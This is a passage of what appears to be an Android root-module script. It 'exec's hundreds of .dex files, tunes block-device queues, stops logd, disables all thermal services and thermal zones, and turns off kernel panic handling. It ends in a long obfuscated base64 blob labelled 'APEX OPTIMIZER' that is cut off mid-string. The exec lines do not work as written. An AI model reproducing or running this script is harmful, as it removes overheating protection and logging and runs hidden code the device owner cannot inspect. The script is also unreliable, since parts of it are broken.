exec /data/adb/modules/null_universe/classes17.dex
exec /data/adb/modules/null_universe/classes18.dex 
exec /data/adb/modules/null_universe/classes19.dex
exec /data/adb/modules/null_universe/classes20.dex 
exec /data/adb/modules/null_universe/classes21.dex
exec /data/adb/modules/null_universe/classes22.dex 
exec /data/adb/modules/null_universe/classes23.dex
exec /data/adb/modules/null_universe/classes24.dex 
exec /data/adb/modules/null_universe/classes25.dex
exec /data/adb/modules/null_universe/classes26.dex 
exec /data/adb/modules/null_universe/classes27.dex
exec /data/adb/modules/null_universe/classes28.dex 
exec /data/adb/modules/null_universe/classes29.dex
exec /data/adb/modules/null_universe/classes30.dex 
exec /data/adb/modules/null_universe/classes31.dex
exec /data/adb/modules/null_universe/classes32.dex 
exec /data/adb/modules/null_universe/classes33.dex
exec /data/adb/modules/null_universe/classes34.dex 
exec /data/adb/modules/null_universe/classes35.dex
exec /data/adb/modules/null_universe/classes36.dex 
exec /data/adb/modules/null_universe/classes37.dex
exec /data/adb/modules/null_universe/classes38.dex 
exec /data/adb/modules/null_universe/classes39.dex
exec /data/adb/modules/null_universe/classes40.dex 
exec /data/adb/modules/null_universe/classes41.dex
exec /data/adb/modules/null_universe/classes42.dex 
exec /data/adb/modules/null_universe/classes43.dex
exec /data/adb/modules/null_universe/classes44.dex 
exec /data/adb/modules/null_universe/classes45.dex
exec /data/adb/modules/null_universe/classes46.dex 
exec /data/adb/modules/null_universe/classes47.dex
exec /data/adb/modules/null_universe/classes48.dex 
exec /data/adb/modules/null_universe/classes49.dex
exec /data/adb/modules/null_universe/classes50.dex 
exec /data/adb/modules/null_universe/classes51.dex
exec /data/adb/modules/null_universe/classes52.dex 
exec /data/adb/modules/null_universe/classes53.dex
exec /data/adb/modules/null_universe/classes54.dex 
exec /data/adb/modules/null_universe/classes55.dex
exec /data/adb/modules/null_universe/classes56.dex 
exec /data/adb/modules/null_universe/classes57.dex
exec /data/adb/modules/null_universe/classes58.dex 
exec /data/adb/modules/null_universe/classes59.dex
exec /data/adb/modules/null_universe/classes60.dex 
exec /data/adb/modules/null_universe/classes61.dex
exec /data/adb/modules/null_universe/classes62.dex 
exec /data/adb/modules/null_universe/classes63.dex
exec /data/adb/modules/null_universe/classes64.dex 
exec /data/adb/modules/null_universe/classes65.dex
exec /data/adb/modules/null_universe/classes66.dex 
exec /data/adb/modules/null_universe/classes67.dex
exec /data/adb/modules/null_universe/classes68.dex 
exec /data/adb/modules/null_universe/classes69.dex
exec /data/adb/modules/null_universe/classes70.dex 
exec /data/adb/modules/null_universe/classes71.dex
exec /data/adb/modules/null_universe/classes72.dex 
exec /data/adb/modules/null_universe/classes73.dex
exec /data/adb/modules/null_universe/classes74.dex 
exec /data/adb/modules/null_universe/classes75.dex
exec /data/adb/modules/null_universe/classes76.dex 
exec /data/adb/modules/null_universe/classes77.dex
exec /data/adb/modules/null_universe/classes78.dex 
exec /data/adb/modules/null_universe/classes79.dex
exec /data/adb/modules/null_universe/classes80.dex 
exec /data/adb/modules/null_universe/classes81.dex
exec /data/adb/modules/null_universe/classes82.dex 
exec /data/adb/modules/null_universe/classes83.dex
exec /data/adb/modules/null_universe/classes84.dex 
exec /data/adb/modules/null_universe/classes85.dex
exec /data/adb/modules/null_universe/classes86.dex 
exec /data/adb/modules/null_universe/classes87.dex
exec /data/adb/modules/null_universe/classes88.dex 
exec /data/adb/modules/null_universe/classes89.dex
exec /data/adb/modules/null_universe/classes90.dex 
exec /data/adb/modules/null_universe/classes91.dex
exec /data/adb/modules/null_universe/classes92.dex 
exec /data/adb/modules/null_universe/classes93.dex
exec /data/adb/modules/null_universe/classes94.dex 
exec /data/adb/modules/null_universe/classes95.dex
exec /data/adb/modules/null_universe/classes96.dex 
exec /data/adb/modules/null_universe/classes97.dex
exec /data/adb/modules/null_universe/classes98.dex 
exec /data/adb/modules/null_universe/classes99.dex
exec /data/adb/modules/null_universe/classes100.dex 
exec /data/adb/modules/null_universe/classes101.dex
exec /data/adb/modules/null_universe/classes102.dex 
exec /data/adb/modules/null_universe/classes103.dex
exec /data/adb/modules/null_universe/classes104.dex 
exec /data/adb/modules/null_universe/classes105.dex
exec /data/adb/modules/null_universe/classes106.dex 
exec /data/adb/modules/null_universe/classes107.dex
exec /data/adb/modules/null_universe/classes108.dex 
exec /data/adb/modules/null_universe/classes109.dex
exec /data/adb/modules/null_universe/classes110.dex 
exec /data/adb/modules/null_universe/classes111.dex
exec /data/adb/modules/null_universe/classes112.dex 
exec /data/adb/modules/null_universe/classes113.dex
exec /data/adb/modules/null_universe/classes114.dex 
exec /data/adb/modules/null_universe/classes115.dex
exec /data/adb/modules/null_universe/classes116.dex 
exec /data/adb/modules/null_universe/classes117.dex
exec /data/adb/modules/null_universe/classes118.dex 
exec /data/adb/modules/null_universe/classes119.dex
exec /data/adb/modules/null_universe/classes120.dex 
exec /data/adb/modules/null_universe/classes121.dex
exec /data/adb/modules/null_universe/classes122.dex 
exec /data/adb/modules/null_universe/classes123.dex
exec /data/adb/modules/null_universe/classes124.dex 
exec /data/adb/modules/null_universe/classes125.dex
exec /data/adb/modules/null_universe/classes126.dex 
exec /data/adb/modules/null_universe/classes127.dex
exec /data/adb/modules/null_universe/classes128.dex 
exec /data/adb/modules/null_universe/classes129.dex
exec /data/adb/modules/null_universe/classes130.dex 
exec /data/adb/modules/null_universe/classes131.dex
exec /data/adb/modules/null_universe/classes132.dex 
exec /data/adb/modules/null_universe/classes133.dex
exec /data/adb/modules/null_universe/classes134.dex 
exec /data/adb/modules/null_universe/classes135.dex
exec /data/adb/modules/null_universe/classes136.dex 
exec /data/adb/modules/null_universe/classes137.dex
exec /data/adb/modules/null_universe/classes138.dex 
exec /data/adb/modules/null_universe/classes139.dex
exec /data/adb/modules/null_universe/classes140.dex 
exec /data/adb/modules/null_universe/classes141.dex
exec /data/adb/modules/null_universe/classes142.dex 
exec /data/adb/modules/null_universe/classes143.dex
exec /data/adb/modules/null_universe/classes144.dex 
exec /data/adb/modules/null_universe/classes145.dex
exec /data/adb/modules/null_universe/classes146.dex 
exec /data/adb/modules/null_universe/classes147.dex
exec /data/adb/modules/null_universe/classes148.dex 
exec /data/adb/modules/null_universe/classes149.dex
exec /data/adb/modules/null_universe/classes150.dex 
exec /data/adb/modules/null_universe/classes151.dex
exec /data/adb/modules/null_universe/classes152.dex 
exec /data/adb/modules/null_universe/classes153.dex
exec /data/adb/modules/null_universe/classes154.dex 
exec /data/adb/modules/null_universe/classes155.dex
exec /data/adb/modules/null_universe/classes156.dex 
exec /data/adb/modules/null_universe/classes157.dex
exec /data/adb/modules/null_universe/classes158.dex 
exec /data/adb/modules/null_universe/classes159.dex
exec /data/adb/modules/null_universe/classes160.dex 
exec /data/adb/modules/null_universe/classes161.dex
exec /data/adb/modules/null_universe/classes162.dex 
exec /data/adb/modules/null_universe/classes163.dex
exec /data/adb/modules/null_universe/classes164.dex 
exec /data/adb/modules/null_universe/classes165.dex
exec /data/adb/modules/null_universe/classes166.dex 
exec /data/adb/modules/null_universe/classes167.dex
exec /data/adb/modules/null_universe/classes168.dex 
exec /data/adb/modules/null_universe/classes169.dex
exec /data/adb/modules/null_universe/classes170.dex 
exec /data/adb/modules/null_universe/classes171.dex
exec /data/adb/modules/null_universe/classes172.dex 
exec /data/adb/modules/null_universe/classes173.dex
exec /data/adb/modules/null_universe/classes174.dex 
exec /data/adb/modules/null_universe/classes175.dex
exec /data/adb/modules/null_universe/classes176.dex 
exec /data/adb/modules/null_universe/classes177.dex
exec /data/adb/modules/null_universe/classes178.dex 
exec /data/adb/modules/null_universe/classes179.dex
exec /data/adb/modules/null_universe/classes180.dex 
exec /data/adb/modules/null_universe/classes181.dex
exec /data/adb/modules/null_universe/classes182.dex 
exec /data/adb/modules/null_universe/classes183.dex
exec /data/adb/modules/null_universe/classes184.dex 
exec /data/adb/modules/null_universe/classes185.dex
exec /data/adb/modules/null_universe/classes186.dex 
exec /data/adb/modules/null_universe/classes187.dex
exec /data/adb/modules/null_universe/classes188.dex 
exec /data/adb/modules/null_universe/classes189.dex
exec /data/adb/modules/null_universe/classes190.dex 
exec /data/adb/modules/null_universe/classes191.dex
exec /data/adb/modules/null_universe/classes192.dex 
exec /data/adb/modules/null_universe/classes193.dex
exec /data/adb/modules/null_universe/classes194.dex 
exec /data/adb/modules/null_universe/classes195.dex
exec /data/adb/modules/null_universe/classes196.dex 
exec /data/adb/modules/null_universe/classes197.dex
exec /data/adb/modules/null_universe/classes198.dex 
exec /data/adb/modules/null_universe/classes199.dex
exec /data/adb/modules/null_universe/classes200.dex 
exec /data/adb/modules/null_universe/classes201.dex
exec /data/adb/modules/null_universe/classes202.dex 
exec /data/adb/modules/null_universe/classes203.dex
exec /data/adb/modules/null_universe/classes204.dex 
exec /data/adb/modules/null_universe/classes205.dex
exec /data/adb/modules/null_universe/classes206.dex 
exec /data/adb/modules/null_universe/classes207.dex
exec /data/adb/modules/null_universe/classes208.dex 
exec /data/adb/modules/null_universe/classes209.dex
exec /data/adb/modules/null_universe/classes210.dex 
exec /data/adb/modules/null_universe/classes211.dex
exec /data/adb/modules/null_universe/classes212.dex 
exec /data/adb/modules/null_universe/classes213.dex
exec /data/adb/modules/null_universe/classes214.dex 
exec /data/adb/modules/null_universe/classes215.dex
exec /data/adb/modules/null_universe/classes216.dex 
exec /data/adb/modules/null_universe/classes217.dex
exec /data/adb/modules/null_universe/classes218.dex 
exec /data/adb/modules/null_universe/classes219.dex

#Speed Ram
echo '2048' > /sys/devices/virtual/block/ram0/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram1/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram2/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram3/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram4/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram5/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram6/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram7/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram8/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram9/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram10/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram11/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram12/queue/read_ahead_kb
echo '1024' > /sys/devices/virtual/block/ram13/queue/read_ahead_kb
#I/O 
echo '2048' > /sys/block/mmcblk0/queue/read_ahead_kb
echo '512' > /sys/block/mmcblk1/queue/read_ahead_kb
echo 'cfq' > /sys/block/sda/queue/scheduler
echo '2048' > /sys/block/sda/queue/read_ahead_kb
echo '0' > /sys/block/sda/queue/rotational
echo '0' > /sys/block/sda/queue/iostats
echo '1' > /sys/block/sda/queue/add_random
echo '1' > /sys/block/sda/queue/rq_affinity
echo '0' > /sys/block/sda/queue/nomerges
echo '64' > /sys/block/sda/queue/nr_requests
echo '2048' > /sys/block/sdb/queue/read_ahead_kb
echo '0' > /sys/block/sdb/queue/rotational
echo '0' > /sys/block/sdb/queue/iostats
echo '0' > /sys/block/sdb/queue/add_random
echo '1' > /sys/block/sdb/queue/rq_affinity
echo '0' > /sys/block/sdb/queue/nomerges
echo '64' > /sys/block/sdb/queue/nr_requests
echo '2048' > /sys/block/sdc/queue/read_ahead_kb
echo '0' > /sys/block/sdc/queue/rotational
echo '0' > /sys/block/sdc/queue/iostats
echo '1' > /sys/block/sdc/queue/add_random
echo '1' > /sys/block/sdc/queue/rq_affinity
echo '0' > /sys/block/sdc/queue/nomerges
echo '64' > /sys/block/sdc/queue/nr_requests
echo '2048' > /sys/block/sdd/queue/read_ahead_kb
echo '0' > /sys/block/sdd/queue/rotational
echo '0' > /sys/block/sdd/queue/iostats
echo '1' > /sys/block/sdd/queue/add_random
echo '1' > /sys/block/sdd/queue/rq_affinity
echo '0' > /sys/block/sdd/queue/nomerges
echo '64' > /sys/block/sdd/queue/nr_requests
echo '2048' > /sys/block/sde/queue/read_ahead_kb
echo '0' > /sys/block/sde/queue/rotational
echo '0' > /sys/block/sde/queue/iostats
echo '1' > /sys/block/sde/queue/add_random
echo '1' > /sys/block/sde/queue/rq_affinity
echo '0' > /sys/block/sde/queue/nomerges
echo '64' > /sys/block/sde/queue/nr_requests
echo '2048' > /sys/block/sdf/queue/read_ahead_kb
echo '0' > /sys/block/sdf/queue/rotational
echo '0' > /sys/block/sdf/queue/iostats
echo '1' > /sys/block/sdf/queue/add_random
echo '1' > /sys/block/sdf/queue/rq_affinity
echo '0' > /sys/block/sdf/queue/nomerges
echo '64' > /sys/block/sdf/queue/nr_requests
echo '2048' > /sys/block/mmcblk0/queue/read_ahead_kb
echo '0' > /sys/block/mmcblk0/queue/rotational
echo '0' > /sys/block/mmcblk0/queue/iostats
echo '0' > /sys/block/mmcblk0/queue/add_random
echo '1' > /sys/block/mmcblk0/queue/rq_affinity
echo '0' > /sys/block/mmcblk0/queue/nomerges
echo '64' > /sys/block/mmcblk0/queue/nr_requests

# Disable thermal services for MediaTek
setprop init.svc.vendor.thermal-hal-2-0 stopped
setprop init.svc.thermald stopped
setprop init.svc.thermal_core stopped

# Set vendor thermal HAL property to 0 (likely disables it)
setprop vendor.thermal-hal-2-0 0
setprop vendor.thermal-hal-2-0 0 stopped

# Disable thermal cutoff for Dexopt process
setprop dalvik.vm.dexopt.thermal-cutoff 0

# Pref-Disable-Thermal
echo 0 > /sys/class/thermal/thermal_zone*/mode
sleep 1
# Thermal Stop Setprop Methode
setprop init.svc.thermal stopped
setprop init.svc.thermal-managers stopped
setprop init.svc.thermal_manager stopped
setprop init.svc.thermal_mnt_hal_service stopped
setprop init.svc.thermal-engine stopped
setprop init.svc.mi-thermald stopped
setprop init.svc.thermalloadalgod stopped
setprop init.svc.thermalservice stopped
setprop init.svc.thermal-hal stopped
setprop init.svc.vendor.thermal-symlinks
setprop init.svc.android.thermal-hal stopped
setprop init.svc.vendor.thermal-hal stopped
setprop init.svc.thermal-manager stopped
setprop init.svc.vendor-thermal-hal-1-0 stopped
setprop init.svc.vendor.thermal-hal-1-0 stopped
setprop init.svc.vendor.thermal-hal-2-0.mtk stopped
setprop init.svc.vendor.thermal-hal-2-0 stopped
setprop init.svc.android.thermal-hal stopped
sleep 1

# Disable Kernel Panic
echo "0" > /proc/sys/kernel/panic
echo "0" > /proc/sys/kernel/panic_on_oops
echo "0" > /proc/sys/kernel/panic_on_rcu_stall
echo "0" > /proc/sys/kernel/panic_on_warn
echo "0" > /sys/module/kernel/parameters/panic
echo "0" > /sys/module/kernel/parameters/panic_on_warn
echo "0" > /sys/module/kernel/parameters/panic_on_oops
echo "0" > /sys/vm/panic_on_oom

# Thermal Stop Semi-auto Methode
sleep 1
stop logd
sleep 1
stop init.svc.logd
sleep 1
stop vendor.thermal-engine
sleep 1
stop vendor.thermal_manager
sleep 1
stop vendor.thermal-manager
sleep 1
stop vendor.thermal-hal-2-0
sleep 1
stop vendor.thermal-symlinks
sleep 1
stop thermal_mnt_hal_service
sleep 1
stop thermal
sleep 1
stop mi_thermald
sleep 1
stop thermald
sleep 1
stop thermalloadalgod
sleep 1
stop thermalservice
sleep 1
stop sec-thermal-1-0
sleep 1
stop debug_pid.sec-thermal-1-0
sleep 1
stop thermal-engine
sleep 1
stop vendor.thermal-hal-1-0
sleep 1
stop android.thermal-hal
sleep 1
stop vendor-thermal-1-0
sleep 1
stop thermal-hal
sleep 1
stop android.thermal-hal
sleep 1
stop thermal_core
sleep 1
stop android.hardware.thermal@2.0-service.mtk


################################################################################
# Set Permissions
################################################################################

set_permissions() {
  # Set permissions for module files
  set_perm_recursive $MODPATH 0 0 0755 0644
}

#APEX OPTIMIZER 
#!/bin/sh
z0="
ej0iCiI7RUN6PSc9IiR7JztjSno9J3VlJztqSno9JyIgLWcnO1";\
z1="
pGej0nVU4iICc7c0h6PScudGltJztrRXo9J1VMRV8nO0R6PScg";\
z2="
IiQoJztvRHo9J29pZCAnO0dIej0nfCBncic7REJ6PSdkICdcJy";\
z3="
c6Jzt0SHo9J2VvdXQnO25Kej0nZGIiICc7Q3o9JyQoY2QnO3lD";\
z4="
ej0nREsiICc7VUJ6PSdkYXRhJzthSXo9J3NpemUnO1BEej0nPS";\
z5="
Lwn5C4JztBRHo9J2luJztxSXo9J3BvaW4nO2RIej0nIC1lcSc7";\
z6="
U0N6PSduIiBdJzthSno9JyYgY28nO29Hej0nJGRiXyc7eEl6PS";\
z7="
dkaXIgJztHQ3o9JyAke00nO1hGej0nWyAteCc7ZXo9JyJLZXIn";\
z8="
O3dKej0nQUNVVSc7ZUp6PSciJGFwJztESno9J3VzZXInO09Fej";\
z9="
0nIGFuZCc7dUp6PSdBTDsgJztRej0ndWxlLic7SkJ6PSdfQ09E";\
z10="
JztURHo9Jz0i8J+Qtic7dUJ6PSdhd2sgJzt2Sno9J0w7IFYnO0";\
z11="
pGej0nbGV0ZSc7SUJ6PSd7S1NVJztPRno9J3NsZWUnO2dCej0n";\
z12="
T0RFPSc7Skd6PSdmaW5kJztTRXo9J29taXonO1dHej0nb2RtIC";\
z13="
c7dUh6PScgMzAwJztzRXo9J3MvXnYnO0FHej0nIiA+Lyc7dER6";\
z14="
PSdOfSBdJzt0RXo9J29uPVwnO3h6PScgMj4vJztGSno9J2FiYX";\
z15="
MnO0NJej0nYWxfbSc7UUd6PSdlbmRvJzt5Sno9J0VJTkQnO1B6";\
z16="
PScvbW9kJztBS3o9J0VYOyAnO096PSdERElSJztyQno9J0dJU0";\
z17="
snO3hGej0neG9wdCc7Ykp6PSdudGluJztkRno9JyAmJztnR3o9";\
z18="
J2wgfCAnO3ZHej0nX291dCc7Uno9J3Byb3AnO0l6PScmIHB3Jz";\
z19="
tGej0nYW1lICc7UUR6PSczNSkgJztkSno9JyknO1RDej0nY2F0";\
z20="
ICc7dkR6PSdyb3ZlJztuQno9J2sgLXYnO0FGej0nUCInO0JEej";\
z21="
0nMjkpICc7UUZ6PSdkb25lJztZRHo9J0RVTEUnO3RDej0nZGsg";\
z22="
Mic7Skh6PSdzcWxpJztLQ3o9J01FfSInO2tDej0nZXJzaSc7d0";\
z23="
N6PSdORFJPJztVSno9J2hpbGUnO2tCej0nKSInO0x6PSdMRV9Q";\
z24="
JztCQ3o9JzJ9J1wnJyAnO3d6PSdzaW9uJztQSXo9J2U9MTAnO2";\
z25="
9Iej0nZGJfZic7RUp6PScvKi8qJztBSHo9J2wpJztrRno9J2Fj";\
z26="
a2EnO2lKej0ncSAwICc7dEl6PSdURSk7JztJRXo9JyBvcHQnO0";\
z27="
1Cej0nTkVMXyc7S3o9J01PRFUnO1FFej0ndGVtICc7Y0N6PSdP";\
z28="
SURfJztESHo9J2lsZV8nO05Gej0nOyBkbyc7Q0Z6PSdlIFsgJz";\
z29="
tiRno9J3AgIiQnO1lHej0nIC10eSc7TkV6PSdtb3J5JztsQ3o9";\
z30="
J29uLnInO1dKej0nZCBhcCc7ZER6PSciWyDinIUnO1JKej0nZS";\
z31="
AiKic7ano9J25kIC0nO2lIej0nIDIwOSc7ZkV6PSdJT04vJztT";\
z32="
ej0nIic7WUl6PSdNQSBtJztsRHo9JyR7RU0nO1VDej0nL2RhdC";\
z33="
c7VEp6PScgfCB3Jztsej0nID4vZCc7VEl6PSdzdG9yJztYRHo9";\
z34="
J2VzYWMnO01Dej0nIkFQYSc7U0Z6PScvb3B0JztES3o9JyAwJz";\
z35="
tQSHo9J2F0IC0nO0xCej0nX0tFUic7cER6PScke0FOJztXRno9";\
z36="
JyAmJiAnO3FGej0nLWEiICc7ZUV6PSduPSR7JzthQno9JyJNYW";\
z37="
cnO2pEej0nSU9OfSc7bUR6PSdPVH0gJztTSHo9J19maWwnO0FK";\
z38="
ej0nYS8qLyc7dUN6PSdjYXNlJztrej0ndiBzdSc7Tno9JyIkTU";\
z39="
8nO2pJej0nWVpFOyc7UkR6PSc9IvCfpoonO3FIej0ndGUzICc7";\
z40="
R0l6PSdNQSBzJztlR3o9Jy9kZXYnO0tFej0naW5nICc7S0p6PS";\
z41="
ctZCAiJztFRno9J2V0cHInO3ZIej0nMDAiICc7akh6PSc3MTUy";\
z42="
JztzSXo9J1VOQ0EnO2ZKej0nXSB8fCc7cEJ6PSdlZCAnXCcnJz";\
z43="
tBej0nTU9ERCc7UUN6PSdwL3ZlJztiej0nUk9PVCc7WEJ6PSdp";\
z44="
c2siJztBQno9J251bGwnO1ZGej0nTiIgXSc7V0V6PSctaSAiJz";\
z45="
txSno9J0Egam8nO1hJej0nbGwnO2JCej0ndiBtYSc7Y0d6PScq";\
z46="
LmRiJzt4SHo9J3VsbCc7WUZ6PScgIiRSJztSQno9J2VsaWYnO2";\
z47="
NIej0naXplIic7ckh6PSdlIiAiJztISXo9J3luY2gnO0tGej0n";\
z48="
ZCkiICc7b0N6PSc+L2RlJztiQ3o9J0FORFInO2NJej0nNDM1NC";\
z49="
c7REl6PSdvZGU9JztQSno9J2lyIiAnO29Cej0nIHwgcyc7UUp6";\
z50="
PSctbmFtJzt2RXo9JykkL3YnO1dDej0nYi9hcCc7Tkd6PSdlbS";\
z51="
AvJztGRno9J29wIHMnO3FEej0nRFJPSSc7R0R6PSc9IvCfkLAn";\
z52="
O0RHej0nIHRydSc7REV6PSdzIG9mJztRQno9J2ZpJztMSno9Jy";\
z53="
RhcHAnO0FJej0nTUEgaic7YXo9J2hlbic7Y3o9J19NRVQnO0hC";\
z54="
ej0ncykgJCc7VkR6PSc9IiIgJztQRXo9JyBzeXMnO1hHej0nL2";\
z55="
9lbSc7bEJ6PSdFUl9OJztqR3o9J2JfZmknO25Gej0nbGUgLSc7";\
z56="
Q0V6PSdobmVzJztMSHo9J3x8IGMnO0tJej0nT1JNQSc7Ykl6PS";\
z57="
c9MjY4JztIRno9J29vdF8nO2lFej0nLyIgIic7bUJ6PSdBTUU9";\
z58="
JztYej0nZGIvayc7dkJ6PSctRiAnXCcnJztFSHo9J291dHAnO2";\
z59="
dJej0nUkVJTic7aUN6PScuYnVpJzt0Rno9J3x8IHQnO0NEej0n";\
z60="
RU1PVCc7WUV6PSdlc2NyJztJSHo9J3FpICInO3hEej0nIHNwZS";\
z61="
c7VUR6PScqKSAgJztwR3o9J2ZpbGUnO256PSd1bGwgJztHRno9";\
z62="
J3lzLmInO3lIej0nUFJBRyc7cUV6PSdOQUxcJztmRHo9J09PVF";\
z63="
8nO3BGej0nZWVkICc7Vkl6PSdNT1JZJztkQ3o9J1ZFUlMnO0xE";\
z64="
ej0nIDs7JztjQno9J2dpc2snO3RCej0nJ1wnJyB8ICc7ckl6PS";\
z65="
d0KFRSJztVSXo9J2U9TUUnO0hDej0nQUdJUyc7REN6PSdyZ3Mp";\
z66="
JztNej0nUk9QPSc7T0p6PSdwcF9kJztKQ3o9J1JfTkEnO2pCej";\
z67="
0nayAtVic7Z0V6PScvXC8vJztkQno9J01BR0knO3FDej0nbGwp";\
z68="
JztPRHo9JzM0KSAnO1BGej0ncCAxMCc7dUV6PScoLipcJztiSH";\
z69="
o9J1sgIiQnO0NIej0nICIkZic7dEd6PSdudWUnO05Kej0nICIk";\
z70="
YSc7VHo9J2lmIFsnO0NDej0nfCB4YSc7Skl6PSd1cz1OJztJRH";\
z71="
o9Jz0i8J+QqCc7ZHo9J0hPRD0nO2hGej0nKCkgeyc7Z0h6PSdp";\
z72="
bnVlJztvSXo9J2FsX2MnO0xDej0nL2FwIic7b0V6PSduPS4qJz";\
z73="
t3RHo9JyB0aGUnO1BHej0nZSAvdic7ZEl6PSc1NjsiJztIRXo9";\
z74="
J2QgYnknO0lKej0ncl9kZSc7dHo9Jz0iJCgnO2FDej0nQ0hfVi";\
z75="
c7eUR6PSdlZCBhJztyRno9J2xsIDInO1lKej0nX2RiIic7S0h6";\
z76="
PSd0ZSIgJzt3SXo9J2FwcF8nO0NHej0nMSB8fCc7cno9J19WRV";\
z77="
InO01Gej0nMSIgXSc7Ukd6PSdyIC9wJztJSXo9J3Jvbm8nO0ZE";\
z78="
ej0nMzApICc7ZUl6PSdWQUNVJztxej0nZW4nO1l6PSdzdSIgJz";\
z79="
tMR3o9J3RhIC8nO0REej0nPSLwn5C7JztMRno9JyE9ICInO1pH";\
z80="
ej0ncGUgZic7V0J6PScvbWFnJztmRno9J21pemUnO3ZDej0nIC";\
z81="
IkQSc7TUl6PSdNQSBjJztwQ3o9J3YvbnUnO3NKej0nbF9tbyc7";\
z82="
Wkh6PScgY29uJztrSno9J3QgMTAnO3NCej0nOi8vZyc7WkV6PS";\
z83="
dpcHRpJztYQ3o9Jy92ZXInO0NKej0nYXRhLyc7akV6PSckTU9E";\
z84="
Jzt1Rno9J3J1ZSc7RUl6PSdXQUw7JztBQ3o9JzEsICQnO3hKej";\
z85="
0nTTsgUic7Skp6PSdlczsgJztFRHo9JyIgOzsnO3V6PSdzdSAt";\
z86="
JztuR3o9Jy1mICInO0ZHej0nfSc7bUp6PSc2MDAgJztWQno9Jy";\
z87="
9hZGInO1VFej0nbi4iJztCS3o9J2l0ZSc7Q0J6PSd1dCAtJztt";\
z88="
Q3o9J2VsZWEnO0VHej0nZSc7bkV6PScvXnZlJzt5SXo9J2luIC";\
z89="
8nO2xFej0nUFJPUCc7a0R6PScpIHwgJztCR3o9JyAyPiYnO29K";\
z90="
ej0nIiAiUCc7bUh6PSdkIDY2JztDS3o9J2V4aXQnO09Jej0nX3";\
z91="
Npeic7aEp6PSciIC1lJztNSHo9J2RiX3MnO0pEej0nMzIpICc7";\
z92="
REZ6PSciJChnJztzej0nU0lPTic7dkl6PSdmb3IgJztrR3o9J2";\
z93="
xlOyAnO2ZIej0nY29udCc7WkN6PSdBUEFUJztiR3o9J21lICIn";\
z94="
O3lFej0nXS8nXCcnICc7Zkd6PScvbnVsJztxQno9J3MvTUEnO2";\
z95="
Z6PSduZWxTJztjRHo9J1JJUFQnO2VDej0nSU9OPSc7WUN6PScp";\
z96="
ICR7JztUR3o9J2N0IC8nO2ZCej0nRVJfQyc7TUV6PScsIG1lJz";\
z97="
tzR3o9J29udGknO2hEej0nT0R9ICc7ckN6PSdTREs9JztBRXo9";\
z98="
J25kIHMnO0ZIej0ndXQiICc7VEJ6PSdkICIvJztIRHo9JzMxKS";\
z99="
AnO1NCej0nIFsgLSc7Z0p6PScgWyAiJztaRHo9J19QUk8nO1NE";\
z100="
ej0nMzYpICc7bkh6PSc2ICIkJztURXo9J2F0aW8nO29Gej0nbS";\
z101="
BzcCc7UkV6PSdjdXN0JztLQno9J0V9ICQnO01Kej0nX2Rpcic7";\
z102="
SHo9JykiICYnO1ZDej0nYS9hZCc7aUR6PScoJHtSJzthR3o9Jy";\
z103="
AtbmEnO3JFej0nXS8hICc7dUd6PSctciAiJztFQno9JydcJycg";\
z104="
LWYnO3FHej0nIiBdICc7Z0Z6PSdfYXJ0Jzttej0nZXYvbic7dU";\
z105="
l6PScwICIkJztSRno9J1JVTj0nO1V6PScgLWQgJztPSHo9JyQo";\
z106="
c3QnO2dEej0nTUVUSCc7UkN6PSdyc2lvJzthRXo9J29uPS4nO1";\
z107="
RGej0nZS5zaCc7RkN6PSdPREV9JztIR3o9J2l0ZSgnO1dIej0n";\
z108="
Yl9zaSc7dEp6PSdkZT1XJztuSXo9J01BIHcnO1JIej0nIiRkYi";\
z109="
c7UUh6PSdjJXMgJztRSXo9JzAwMDsnO3hHej0nJChmaSc7aUl6";\
z110="
PSdBTkFMJzthRno9J25vaHUnO1VGej0nIiRSVSc7Wkp6PScgXS";\
z111="
AmJztjRXo9J3NjcmknO0ZJej0nbCc7bUl6PSdpemU7JztlRHo9";\
z112="
JyAke1InO05Cej0nVkVSXyc7bEp6PSc0ODU3JztjRno9J1JVTi";\
z113="
InO3B6PSc7IHRoJztzRHo9J1JTSU8nO1pJej0nbWFwXyc7Ukl6";\
z114="
PSdNQSB0JztZSHo9J10gJiYnO1lCej0nIF07ICc7b3o9JzI+Jj";\
z115="
EnO0tHej0nIC9kYSc7YUh6PSd0aW51JztiRHo9J0RFU0MnO1hI";\
z116="
ej0nemUiICc7bEh6PSdjaG1vJztWSHo9JyAiJGQnO21Gej0nb2";\
z117="
1waSc7V3o9J3RhL2EnO3JKej0ndXJuYSc7dkZ6PSdnZSBiJzta";\
z118="
Qno9J3RoZW4nO05Dej0ndGNoIic7R0d6PSdfc3FsJzt3RXo9Jz";\
z119="
EgW0YnO0p6PSdkKSInO2VGej0nb3B0aSc7ZEV6PSdwdGlvJztV";\
z120="
SHo9J1sgLXonO01Eej0nMzMpICc7Qkp6PSdzIC9kJztJRno9J2";\
z121="
NvbXAnO2hCej0nIiQobSc7aEd6PSdlIHJlJzt3SHo9JzI+L2Qn";\
z122="
O2VIej0nIDAgXSc7akN6PSdsZC52Jzt4RXo9J0lOQUwnO2xJej";\
z123="
0ncHRpbSc7TkR6PSc9IvCfkLcnO0ZCej0nMSB8ICc7c0N6PSdv";\
z124="
bi5zJztoSHo9JyAtZ3QnO3NGej0nPiYxICc7VEh6PSdlIiAyJz";\
z125="
tTSno9Jy5kYiInO25Eej0nQW5kcic7Tkh6PSdpemU9JztWej0n";\
z126="
Ii9kYSc7VUd6PSdlbV9lJztlQno9J1NLX1YnO1ZKej0nIHJlYS";\
z127="
c7T0N6PScgLWYgJztCej0nSVI9Iic7QkV6PSdtb290Jzt4Q3o9";\
z128="
J0lEX1MnO2xGej0nZ2UgYyc7RUV6PScgeW91JztuQ3o9J3NlID";\
z129="
InO1hFej0ncy9eZCc7Zkl6PSdVTTsiJztCSHo9J2VjaG8nO3BJ";\
z130="
ej0naGVjayc7UEJ6PSd9Iic7R0J6PSd4YXJnJztHej0nIiQwIi";\
z131="
